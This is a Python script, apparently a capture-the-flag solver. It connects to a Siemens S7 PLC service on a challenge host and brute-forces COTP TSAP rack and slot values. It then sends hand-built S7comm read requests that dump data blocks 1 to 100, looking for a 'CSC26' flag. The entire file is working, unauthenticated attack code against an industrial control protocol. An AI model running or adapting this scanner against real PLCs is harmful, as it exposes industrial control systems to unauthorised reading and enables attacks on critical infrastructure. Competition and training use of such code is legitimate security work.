#!/usr/bin/env python3
import socket
import struct
import time
import sys

HOST = "mnbvcxzqwertyui-csc26.cybersecuritychallenge.al"
PORT = 10023

def create_connection():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((HOST, PORT))
        return sock
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

def connect_cotp(sock):
    # COTP Connection Request (TSAP 01 02 -> Rack 0 / Slot 2)
    # TPKT (4) + COTP (18)
    # TSAP Source: 01 00
    # TSAP Dest: 01 02
    packet = bytes.fromhex("0300001611e00000000100c1020100c2020102c0010a")
    sock.send(packet)
    try:
        data = sock.recv(1024)
        if len(data) > 0 and data[5] == 0xD0: # CC - Connect Confirm
            return True
    except socket.timeout:
        pass
    except Exception as e:
        print(f"[-] COTP Error: {e}")
    return False

def s7_negotiate(sock):
    # Setup Communication (Negotiate PDU length)
    packet = bytes.fromhex("0300001902f080320100000000000800000000f0000001000101e0")
    sock.send(packet)
    try:
        data = sock.recv(1024)
        if len(data) > 0 and len(data) > 10: # Accept any response of decent length
            return True
    except:
        pass
    return False

def build_read_packet(db_num, start_byte, num_bytes):
    # S7 Read Request
    # TPKT(4) + COTP(3) + S7 Header(10) + Params(14)
    # Total Length = 4 + 3 + 10 + 14 = 31 bytes
    
    # 1. TPKT + COTP
    # TPKT: Version 3, Reserved 0, Length 31 (0x1F)
    # COTP: Length 2, PDU Type 0xF0 (Data), EOT/Num 0x80
    tpkt_cotp = bytes([0x03, 0x00, 0x00, 0x1F, 0x02, 0xF0, 0x80])
    
    # 2. S7 Header (10 bytes) 
    # Protocol ID 0x32, ROSCTR 0x01 (Job)
    # Redundancy 0x0000, PDU Ref 0x0005
    # Param Len 0x000E (14), Data Len 0x0000
    s7_header = bytes([
        0x32, 0x01, 
        0x00, 0x00, 
        0x00, 0x05, 
        0x00, 0x0E, 
        0x00, 0x00
    ])

    # 3. Parameters (14 bytes)
    # Function 0x04 (Read Var), Item Count 0x01
    param_head = bytes([0x04, 0x01])
    
    # Item (12 bytes):
    # [0..3]: 12 0a 10 02 (Var Spec, Len, Syntax S7ANY, Type BYTE)
    item_prefix = bytes([0x12, 0x0a, 0x10, 0x02])
    
    # [4..5]: Length (Word)
    item_len = struct.pack(">H", num_bytes)
    
    # [6..7]: DB Number (Word)
    item_db = struct.pack(">H", db_num)
    
    # [8]: Area Code (Byte) - 0x84 for DB
    item_area = bytes([0x84])
    
    # [9..11]: Address (3 Bytes) - Bit address
    address_bits = start_byte * 8
    # Pack to 4 bytes, take last 3
    item_addr = struct.pack(">I", address_bits)[1:]
    
    params = param_head + item_prefix + item_len + item_db + item_area + item_addr
    
    return tpkt_cotp + s7_header + params


def extract_string(data):
    try:
        # Filter for printable chars
        cleaned = "".join([chr(b) if 32 <= b <= 126 else "" for b in data])
        return cleaned
    except:
        return ""

def main():
    print(f"[*] Attacking {HOST}:{PORT}")
    
    # Try different TSAPs (Remote Rack/Slot combinations)
    # 01 00 = Rack 0 Slot 0
    # 01 01 = Rack 0 Slot 1
    # 01 02 = Rack 0 Slot 2 (Standard S7-300)
    # 01 03 = Rack 0 Slot 3 (Standard S7-400)
    # 02 02 = OP Connection to Rack 0 Slot 2
    # 03 01 = S7-1200/1500?
    
    tsaps = [
        bytes.fromhex("0102"), # PG -> S7-300 (Most common)
        bytes.fromhex("0100"), # Rack 0 Slot 0
        bytes.fromhex("0101"), # Rack 0 Slot 1
        bytes.fromhex("0103"), # Rack 0 Slot 3
        bytes.fromhex("0202"), # OP -> S7-300
        bytes.fromhex("0201"), # OP -> Slot 1
        bytes.fromhex("0301"), # Other
    ]

    sizes_to_try = [512, 256, 128] # Reduced set

    for tsap in tsaps:
        print(f"\n[*] Trying TSAP {tsap.hex()}...")
        
        sock = create_connection()
        if not sock:
            continue
            
        # Modify connect_cotp to accept TSAP
        # COTP Connection Request
        # 03 00 00 16 (TPKT)
        # 11 e0 00 00 (COTP CR)
        # 00 01 00 (Source TSAP Parameter: Group 0xC1, Len 2, Val 01 00)
        # c1 02 01 00 
        # c2 02 <TSAP> (Dest TSAP Parameter: Group 0xC2, Len 2, Val TSAP)
        # c0 01 0a (TPDU Size)
        
        packet = (
            bytes.fromhex("0300001611e00000000100") + 
            bytes.fromhex("c1020100") + 
            bytes([0xc2, 0x02]) + tsap + 
            bytes.fromhex("c0010a")
        )
        
        sock.send(packet)
        try:
            data = sock.recv(1024)
            if len(data) == 0:
                print("[-] Socket closed by server (EOF)")
                sock.close()
                continue
            if len(data) > 5 and data[5] == 0xD0: # CC - Connect Confirm
                print(f"[+] TSAP {tsap.hex()} Accepted!")
            else:
                print(f"[-] TSAP {tsap.hex()} Rejected/Unknown response: {data.hex()}")
                sock.close()
                continue
        except Exception as e:
            print(f"[-] Handshake Error: {e}")
            sock.close()
            continue

        # Try S7 Negotiation (Optional)
        s7_negotiate(sock)
        
        # Scan DBs
        for db in range(1, 101):
            sys.stdout.write(f"\rScanning DB {db}...")
            sys.stdout.flush()
            
            flag_found = False
            for size in sizes_to_try:
                packet = build_read_packet(db, 0, size)
                try:
                    sock.send(packet)
                    response = sock.recv(4096)
                    
                    if len(response) == 0:
                        # Reconnect logic
                        # print(f"\n[!] Reconnecting for DB {db}...")
                        sock.close()
                        sock = create_connection()
                        if not sock: break
                        # Handshake again with SAME TSAP
                        sock.send(packet) # Wait, need COTP first!
                        # Quick dirty fix: Resend COTP then packet
                        # Actually, just break inner loop and retry standard way?
                        # For simplicity, we just mark socket as dead and break to next TSAP?
                        # No, we want to finish scanning this TSAP.
                        
                        # Re-establish COTP
                        sock.send(bytes.fromhex("0300001611e00000000100") + bytes.fromhex("c1020100") + bytes([0xc2, 0x02]) + tsap + bytes.fromhex("c0010a"))
                        sock.recv(1024)
                        # Retry the packet
                        sock.send(packet)
                        response = sock.recv(4096)
                    
                    if len(response) > 20:
                        text = extract_string(response)
                        if "CSC26" in text:
                            print(f"\n\n[!!!] FLAG FOUND in DB {db} (TSAP {tsap.hex()}):")
                            print(f"{'='*40}")
                            print(text)
                            print(f"{'='*40}")
                            sock.close()
                            return
                        if len(text) > 5 and "Siemens" not in text:
                             # print(f"\n[?] Data DB {db}: {text}")
                             pass
                        break # Found valid response, next DB
                        
                except Exception as e:
                    # Timeout or valid error
                    # print(f"E: {e}")
                    # Reconnect
                    try:
                        sock.close()
                        sock = create_connection()
                        sock.send(bytes.fromhex("0300001611e00000000100") + bytes.fromhex("c1020100") + bytes([0xc2, 0x02]) + tsap + bytes.fromhex("c0010a"))
                        sock.recv(1024)
                    except:
                        pass
                    pass
        print(f"\n[*] Finished scanning TSAP {tsap.hex()}")
        sock.close()

    print("\n[*] All TSAPs scanned.")

